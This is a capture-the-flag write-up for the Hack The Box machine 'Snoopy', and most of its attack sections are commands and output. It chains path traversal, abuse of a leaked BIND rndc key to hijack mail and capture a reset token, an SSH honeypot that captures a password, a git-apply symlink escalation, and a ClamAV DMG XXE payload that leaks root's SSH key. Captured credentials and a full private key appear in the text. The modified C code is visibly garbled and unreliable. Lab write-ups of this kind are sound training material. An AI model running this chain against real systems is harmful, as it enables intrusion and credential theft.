## Snoopy

### Lab Details 

- Difficulty: Hard
- Type: DNS Zone Transfer, LFI, Linux

#### Enumeration
- run `nmap`
```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 ee:6b:ce:c5:b6:e3:fa:1b:97:c0:3d:5f:e3:f1:a1:6e (ECDSA)
|_  256 54:59:41:e1:71:9a:1a:87:9c:1e:99:50:59:bf:e5:ba (ED25519)
53/tcp open  domain  ISC BIND 9.18.12-0ubuntu0.22.04.1 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.18.12-0ubuntu0.22.04.1-Ubuntu
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: SnoopySec Bootstrap Template - Index
```
- port 80, enumerate web app
	- found email
		- `info@snoopy.htb`
		- `cschultz@snoopy.htb`
		- `hangel@snoopy.htb` 
		- `lpelt@snoopy.htb`
		- `sbrown@snoopy.htb` in `snoopysec_marketing.mp4`
		- `pr@snoopy.htb` in `announcement.pdf`
	- found domain 
		- `snoopy.htb`
- port 53
	- perform a `Zone Transfer` and we get list of subdomains under `snoopy.htb` 
```bash
$ dig @10.129.247.167 axfr snoopy.htb

; <<>> DiG 9.18.33-1~deb12u2-Debian <<>> @10.129.247.167 axfr snoopy.htb
; (1 server found)
;; global options: +cmd
snoopy.htb.		86400	IN	SOA	ns1.snoopy.htb. ns2.snoopy.htb. 2022032612 3600 1800 604800 86400
snoopy.htb.		86400	IN	NS	ns1.snoopy.htb.
snoopy.htb.		86400	IN	NS	ns2.snoopy.htb.
mattermost.snoopy.htb.	86400	IN	A	172.18.0.3
mm.snoopy.htb.		86400	IN	A	127.0.0.1
ns1.snoopy.htb.		86400	IN	A	10.0.50.10
ns2.snoopy.htb.		86400	IN	A	10.0.51.10
postgres.snoopy.htb.	86400	IN	A	172.18.0.2
provisions.snoopy.htb.	86400	IN	A	172.18.0.4
www.snoopy.htb.		86400	IN	A	127.0.0.1
snoopy.htb.		86400	IN	SOA	ns1.snoopy.htb. ns2.snoopy.htb. 2022032612 3600 1800 604800 86400
;; Query time: 3 msec
;; SERVER: 10.129.247.167#53(10.129.247.167) (TCP)
;; WHEN: Sat Oct 18 20:27:30 CDT 2025
;; XFR size: 11 records (messages 1, bytes 325)
```
- add the domains to `/etc/hosts`
```bash
10.129.229.5 snoopy.htb www.snoopy.htb provisions.snoopy.htb postgres.snoopy.htb mm.snoopy.htb mattermost.snoopy.htb 
```
- `mm.snoopy.htb` contains different content than `snoopy.htb`
```bash
## login page at
http://mm.snoopy.htb/login
```
- on the home page of `snoopy.htb` we found a download link to a file named `annoucement.pdf` and the file is fetched at `/download?file=` endpoint
- we can attempt with `LFI` to enumerate for remote files on target file system
![[announcement download.png]]
- enumerate file paths with `....//` to escape for any sanitizations
- test with `/etc/passwd` file and found with `....//....//....//....//....//etc/passwd` combination
![[lfi test.png]]
- attempt with password reset for a user account at `http://mm.snoopy.htb/reset_password`
- we get error `Failed to send password reset email successfully` this might mean that the server is trying to send the password reset email to the user account
![[failed successfully.png]]
- attempt to register an account however looks like the feature is not enabled
![[unable to register mm.png]]
#### Initial Foothold 
- since the target is running `DNS bind` on port 53 we can attempt to fetch the config files
- search for `where is dns bind config files in linux` and we get `/etc/bind/named.conf` and `named.conf.local`
- content of `named.conf.local` located at `http://snoopy.htb/download?file=....//....//....//....//....//etc/bind/named.conf.local`
```bash
//
// Do any local configuration here
//

// Consider adding the 1918 zones here, if they are not used in your
// organization
//include "/etc/bind/zones.rfc1918";

zone "snoopy.htb" IN {
    type master;
    file "/var/lib/bind/db.snoopy.htb";
    allow-update { key "rndc-key"; };
    allow-transfer { 10.0.0.0/8; };
};
```
- content of `named.conf` located at `http://snoopy.htb/download?file=....//....//....//....//....//etc/bind/named.conf`
```bash
// This is the primary configuration file for the BIND DNS server named.
//
// Please read /usr/share/doc/bind9/README.Debian.gz for information on the 
// structure of BIND configuration files in Debian, *BEFORE* you customize 
// this configuration file.
//
// If you are just adding zones, please do that in /etc/bind/named.conf.local

include "/etc/bind/named.conf.options";
include "/etc/bind/named.conf.local";
include "/etc/bind/named.conf.default-zones";

key "rndc-key" {
    algorithm hmac-sha256;
    secret "BEqUtce80uhu3TOEGJJaMlSx9WT2pkdeCtzBeDykQQA=";
};
```
- `allow-update` directive in `named.conf` specifies the permissions for making updates to the `DNS` zone. 
- in this case, it specifies a key, denoted as `"rndc-key"` , which acts as the authentication mechanism.
- to exploit this we can add a zone to the `DNS` service, using `nsupdate` 
- the zone of interest would be `mail.snoopy.htb` which points back to our `ip` address so that we can capture any emails sent from the server
- save the key into a file 
```bash
$ nsupdate -k rndc.key
> server 10.129.229.5
> zone snoopy.htb
> update add mail.snoopy.htb. 60 A 10.10.14.23
> send
> quit
`nsupdate` : tool used for making dynamic updates to DNS zones
`-k` : specify the key file to which we saved the obtained rndc key earlier
`server` :  IP address of target; subsequent updates will be sent to this server
`zone` : DNS zone to be updated, in this case, snoopy.htb 
`update add` : adding a new DNS record within the specified zone
`mail.snoopy.htb` with a TTL (time to live) of 60 seconds, mapping the domain to the IP address of our attacking machine
```
- convert the new `email.snoopy.htb` domain has been added
```bash
$ dig @10.129.229.5 axfr snoopy.htb

; <<>> DiG 9.18.33-1~deb12u2-Debian <<>> @10.129.247.167 axfr snoopy.htb
; (1 server found)
;; global options: +cmd
snoopy.htb.		86400	IN	SOA	ns1.snoopy.htb. ns2.snoopy.htb. 2022032613 3600 1800 604800 86400
snoopy.htb.		86400	IN	NS	ns1.snoopy.htb.
snoopy.htb.		86400	IN	NS	ns2.snoopy.htb.
mail.snoopy.htb.	60	IN	A	10.10.14.82
mattermost.snoopy.htb.	86400	IN	A	172.18.0.3
mm.snoopy.htb.		86400	IN	A	127.0.0.1
ns1.snoopy.htb.		86400	IN	A	10.0.50.10
ns2.snoopy.htb.		86400	IN	A	10.0.51.10
postgres.snoopy.htb.	86400	IN	A	172.18.0.2
provisions.snoopy.htb.	86400	IN	A	172.18.0.4
www.snoopy.htb.		86400	IN	A	127.0.0.1
snoopy.htb.		86400	IN	SOA	ns1.snoopy.htb. ns2.snoopy.htb. 2022032613 3600 1800 604800 86400
;; Query time: 3 msec
;; SERVER: 10.129.247.167#53(10.129.247.167) (TCP)
;; WHEN: Sun Oct 19 07:21:12 CDT 2025
;; XFR size: 12 records (messages 1, bytes 346)
```
- once it has been added we can load up `wireshark` and let it capture packets over `tun0` so we can monitor any request send from server to us for password resets
- im using `htb pwnbox` so below are the commands to run `wireshark over tun0`
```bash
$ export DISPLAY=:1

$ sudo cp ~/.Xauthority /root/

$ sudo XAUTHORITY=/home/$USER/.Xauthority DISPLAY=:1 wireshark -i tun0
```
- when sed reset email fnding a passworor user `sbrown@snoopy.htb` we get error response from the server since we do not have any mail server configured
![[wireshark email from target.png]]
- set up `postfix` for mail services to receive emails 
- when we attempt to reset the password we get mail communication between target server and our email server 
![[mail com from target.png]]
- now we need to attempt to capture the content of the email from target server to our mail server
- we can use `smtpd` module from python and the `versions < python3.11`
```bash
$ sudo python3.11 -m smtpd -n -c DebuggingServer 0.0.0.0:25
```
- update the `DNS domains again` with `usupdate` and hit reset password
![[password reset.png]]
- we get the password reset email
```bash
$ sudo python3.11 -m smtpd -n -c DebuggingServer 0.0.0.0:25
/usr/local/lib/python3.11/smtpd.py:96: DeprecationWarning: The asyncore module is deprecated and will be removed in Python 3.12. The recommended replacement is asyncio
  import asyncore
/usr/local/lib/python3.11/smtpd.py:97: DeprecationWarning: The asynchat module is deprecated and will be removed in Python 3.12. The recommended replacement is asyncio
  import asynchat
---------- MESSAGE FOLLOWS ----------
mail options: ['BODY=8BITMIME']
b'MIME-Version: 1.0'
b'Content-Transfer-Encoding: 8bit'
b'Precedence: bulk'
b'Reply-To: "No-Reply" <no-reply@snoopy.htb>'
b'Message-ID: <hyg5br5pcnj1ge4t-1760963814@mm.snoopy.htb>'
b'From: "No-Reply" <no-reply@snoopy.htb>'
b'To: sbrown@snoopy.htb'
b'Subject: [Mattermost] Reset your password'
b'Date: Mon, 20 Oct 2025 12:36:54 +0000'
b'Auto-Submitted: auto-generated'
b'Content-Type: multipart/alternative;'
b' boundary=d11b9b75ec003f1369f9579cb0102ab13381054e80da5d88e620109e8edf'
b'X-Peer: 10.129.229.5'
b''
b'--d11b9b75ec003f1369f9579cb0102ab13381054e80da5d88e620109e8edf'
b'Content-Transfer-Encoding: quoted-printable'
b'Content-Type: text/plain; charset=UTF-8'
b''
b'Reset Your Password'
b'Click the button below to reset your password. If you didn=E2=80=99t reques='
b't this, you can safely ignore this email.'
b''
b'Reset Password ( http://mm.snoopy.htb/reset_password_complete?token=3D6r5yr='
b'eqe6ddzut8jxqjtucz6y1fe718cbdu3fkh9akw61gf7uqy38r56gknf5w31 )'
b''
b'The password reset link expires in 24 hours.'
b''
b'Questions?'
b'Need help or have questions? Email us at support@snoopy.htb ( support@snoop='
b'y.htb )'
b''
b'=C2=A9 2022 Mattermost, Inc. 530 Lytton Avenue, Second floor, Palo Alto, CA='
b', 94301'
b'--d11b9b75ec003f1369f9579cb0102ab13381054e80da5d88e620109e8edf'
b'Content-Transfer-Encoding: quoted-printable'
b'Content-Type: text/html; charset=UTF-8'
b''
b''
b''
b''
b'<!doctype html>'
<SNIP>
```
- visit the URL in the email to reset password
- when attempting to reset password we get error 
![[token error failed to password reset.png]]
- use `cyberchef` to decode the URL
![[url decode.png]]
- we can reset password with decoded URL
![[password updated successfully.png]]
- after we have logged in we can enumerate the forum
- found a new channel has been created regarding new server provisions
- search for the new channel in `find channel` 
![[find new channel mm.png]]
- type `/` will list commands that exists in the channel 
- going through the commands we see `server_provision`
![[mm channel command.png]]
- send it and we get a request form
![[new server form.png]]
- we get a message from `cbrown` stating that he will work on it later
![[cbrown response.png]]
- but when we enter a invalid `ip address` we get message from `cbrown` stating the network must be having issues 
- from this we can deduce that the user might be attempting to connect the server using `ssh`
- we can exploit this with a `ssh` honey pot to capture login attempts 
- we will use `sshesame`
- set up the honey pot with below commands
```bash
$ git clone https://github.com/jaksi/sshesame

$ cd sshesame

$ go build

$ sed -i 's/127.0.0.1:2022/0.0.0.0:2222/g' sshesame.yaml

$ sudo systemctl stop ssh

./sshesame -config sshesame.yaml
```
- send another request pointing back to our `ip`
![[cbrown response.png]]
- we get credential back as `cbrown`
```bash
$ ./sshesame -config sshesame.yaml
INFO 2025/10/19 08:02:19 No host keys configured, using keys at "/home/ch4os1/.local/share/sshesame"
INFO 2025/10/19 08:02:19 Host key "/home/ch4os1/.local/share/sshesame/host_rsa_key" not found, generating it
INFO 2025/10/19 08:02:20 Host key "/home/ch4os1/.local/share/sshesame/host_ecdsa_key" not found, generating it
INFO 2025/10/19 08:02:20 Host key "/home/ch4os1/.local/share/sshesame/host_ed25519_key" not found, generating it
INFO 2025/10/19 08:02:20 Listening on [::]:2222
2025/10/19 08:02:37 [10.129.247.167:57018] authentication for user "cbrown" with password "sn00pedcr3dential!!!" accepted
2025/10/19 08:02:37 [10.129.247.167:57018] connection with client version "SSH-2.0-paramiko_3.1.0" established
2025/10/19 08:02:37 [10.129.247.167:57018] [channel 0] session requested
2025/10/19 08:02:37 [10.129.247.167:57018] [channel 0] command "ls -la" requested
2025/10/19 08:02:37 [10.129.247.167:57018] [channel 0] closed
2025/10/19 08:02:37 [10.129.247.167:57018] connection closed
```
#### Lateral Movement (If any)
- since we have the password of user `cbrown` we can attempt to run `sudo -l`
```bash
cbrown@snoopy:/home$ sudo -l
[sudo] password for cbrown: 
Matching Defaults entries for cbrown on snoopy:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass

User cbrown may run the following commands on snoopy:
    (sbrown) PASSWD: /usr/bin/git ^apply -v [a-zA-Z0-9.]+$
```

```bash
cbrown@snoopy:/dev/shm$ cd /dev/shm; mkdir rce; chown :devops rce; cd rce; git init .
 ln -s /home/sbrown/.ssh symlink
 git add symlink
 git commit -m "add symlink"
hint: Using 'master' as the name for the initial branch. This default branch name
hint: is subject to change. To configure the initial branch name to use in all
hint: of your new repositories, which will suppress this warning, call:
hint: 
hint: 	git config --global init.defaultBranch <name>
hint: 
hint: Names commonly chosen instead of 'master' are 'main', 'trunk' and
hint: 'development'. The just-created branch can be renamed via this command:
hint: 
hint: 	git branch -m <name>
Initialized empty Git repository in /dev/shm/rce/.git/
[master (root-commit) 8d65d31] add symlink
 Committer: Charlie Brown <cbrown@snoopy.htb>
Your name and email address were configured automatically based
on your username and hostname. Please check that they are accurate.
You can suppress this message by setting them explicitly. Run the
following command and follow the instructions in your editor to edit
your configuration file:

    git config --global --edit

After doing this, you may fix the identity used for this commit with:

    git commit --amend --reset-author

 1 file changed, 1 insertion(+)
 create mode 120000 symlink
cbrown@snoopy:/dev/shm/rce$ vim patch
cbrown@snoopy:/dev/shm/rce$  sudo -u sbrown /usr/bin/git apply -v patch
Checking patch symlink => renamed-symlink...
Checking patch renamed-symlink/authorized_keys...
Applied patch symlink => renamed-symlink cleanly.
Applied patch renamed-symlink/authorized_keys cleanly.
```
#### Privilege Escalation
- check `sudo -l`
```bash
sbrown@snoopy:~/scanfiles$ sudo -l
Matching Defaults entries for sbrown on snoopy:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass

User sbrown may run the following commands on snoopy:
    (root) NOPASSWD: /usr/local/bin/clamscan ^--debug /home/sbrown/scanfiles/[a-zA-Z0-9.]+$
```
- we are able to run `clamscan` on files in `/home/sbrown/scanfiles/`
- check the `clamscan` version, the version is `1.0.0`
```bash
sbrown@snoopy:~/scanfiles$ clamscan --version
ClamAV 1.0.0/26853/Fri Mar 24 07:24:11 2023
```
- search for vulnerabilities relating this version of `clamscan`
- found [this post](https://thehackernews.com/2023/02/critical-rce-vulnerability-discovered.html)
- which explains that `clamav`'s `dmg` file parser contains an information leak via `XML` infiltration 
- `dmg` file is `Aple Disk Image` file which is a digital mountable version of a physical dics 
- we can use[ `libdmg-hfsplus`](https://github.com/fanquake/libdmg-hfsplus) to manipulate `dmg` file and inject `XML` infiltration codes 
- first we will need to create a disk image file `dmg` file  using tool like `genisoimage`
```bash
$ sudo apt-get install genisoimage
$ genisoimage -V progname -D -R -apple -no-pad -o progname.dmg /mnt
```
- once we have created the `dmg` file 
- we can manipulate the `dmg` file by injection malicious `xml`
- to work with `dmg` file we will need to use tool like [`libdmg-hfsplus`](https://github.com/fanquake/libdmg-hfsplus)
```bash
$ git clone https://github.com/fanquake/libdmg-hfsplus
```
- going through the `dmg` folder in `libdmg-hsplus` there is a `resouces.c`, which contains the `xml` data that we can attempt to tamper with 
```bash
$ ls dmg            
abstractfile.c  base64.c  checksum.c  CMakeLists.txt  crc32.c  dmg.c  dmglib.c  io.c  resources.c  udif.c
```
- on lines 97-101 we change the contents to the following:
```c
const char *plistHeader =
		"<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
		"<!DOCTYPE plist [<!ENTITY xxe SYSTEM \"file:///root/.ssh/id_rsa\">]>\n"
		"<plist version=\"1.0\">\n"
		"<dict>\n";
```
- we will need to modify line 689-697 to call the modified code 
```c
void writeResources(AbstractFile *file, ResourceKey *resources) {
 ResourceKey *curResource;
 ResourceData *curData;
 abstractFilePrint(file, plistHeader);
 abstractFilePrint(file, "\t<key>resource-fork</key>\n\t<dict>\n");
 curResource = resources;
 while (curResource != NULL) {
 abstractFilePrint(file, "\t\t<key>%s</key>\n\t\t<array>\n",
 "&xxe;");
 //                    
  curResource->key);
 curData = curResource->data;
 while (curData != NULL) {
  }
 }
 writeResourceData(file, curData, curResource->flipData, 3);
 curData = curData->next;
  }
 abstractFilePrint(file, "\t\t</array>\n", curResource->key);
 curResource = curResource->next;
 //abstractFilePrint(file, "\t</dict>\n");
 //abstractFilePrint(file, plistFooter);
```
- once we are done with modifying the `resources.c` file we can compile the modified file into the `dmg` file we have created earlier
```bash
$ cmake . -B build
 
$ make -C build/dmg -j8

make: Entering directory '/home/kali/WriteUps-HTB/Hard/Snoopy/libdmg-hfsplus/build/dmg'
[ 27%] Building C object dmg/CMakeFiles/dmg.dir/checksum.c.o
[ 36%] Building C object dmg/CMakeFiles/dmg.dir/resources.c.o
[ 45%] Building C object dmg/CMakeFiles/dmg.dir/dmglib.c.o
[ 45%] Building C object dmg/CMakeFiles/dmg.dir/crc32.c.o
[ 54%] Building C object dmg/CMakeFiles/dmg.dir/abstractfile.c.o
[ 63%] Building C object dmg/CMakeFiles/dmg.dir/udif.c.o
[ 63%] Building C object dmg/CMakeFiles/dmg.dir/base64.c.o
[ 72%] Building C object dmg/CMakeFiles/dmg.dir/io.c.o
/home/kali/WriteUps-HTB/Hard/Snoopy/libdmg-hfsplus/dmg/resources.c: In function ‘writeNSiz’:
/home/kali/WriteUps-HTB/Hard/Snoopy/libdmg-hfsplus/dmg/resources.c:502:21: warning: ‘curData’ may be used uninitialized [-Wmaybe-uninitialized]
  502 |       curData->next = (ResourceData *)malloc(sizeof(ResourceData));
      |       ~~~~~~~~~~~~~~^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
/home/kali/WriteUps-HTB/Hard/Snoopy/libdmg-hfsplus/dmg/resources.c:484:17: note: ‘curData’ was declared here
  484 |   ResourceData *curData;
      |                 ^~~~~~~
[ 81%] Linking C static library libdmg.a
[ 81%] Built target dmg
[ 90%] Building C object dmg/CMakeFiles/dmg-bin.dir/dmg.c.o
[100%] Linking C executable dmg
[100%] Built target dmg-bin
make: Leaving directory '/home/kali/WriteUps-HTB/Hard/Snoopy/libdmg-hfsplus/build/dmg'

## 
$  build/dmg/dmg progname.dmg c.dmg

Wrote out BLKX data.
Wrote out XML plist data...
Wrote out koly header.
Done
```
- load the final `dmg` file to target directory 
```bash
sbrown@snoopy:~/scanfiles$ wget 10.10.16.56:8000/c.dmg
--2025-10-21 04:34:17--  http://10.10.16.56:8000/c.dmg
Connecting to 10.10.16.56:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4726 (4.6K) [application/x-apple-diskimage]
Saving to: ‘c.dmg’

c.dmg                                     100%[=====================================================================================>]   4.62K  12.8KB/s    in 0.4s    

2025-10-21 04:34:19 (12.8 KB/s) - ‘c.dmg’ saved [4726/4726]
```
- execute `clamscan` and we will see the root `ssh` private key from output
```bash
sbrown@snoopy:~/scanfiles$  sudo clamscan --debug /home/sbrown/scanfiles/c.dmg
<SNIP>
LibClamAV debug: cli_scandmg: wanted blkx, text value is -----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
<snip>
```
- save the private key and change the permission then we can use the private key to login to target as root via `ssh`
```bash
$ chmod 600 id_rsa 
$ ssh root@10.129.229.5 -i id_rsa 
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-71-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Fri May 12 21:28:56 2023 from 10.10.14.46
root@snoopy:~#
```
#### Resources

#### Lesson Learned
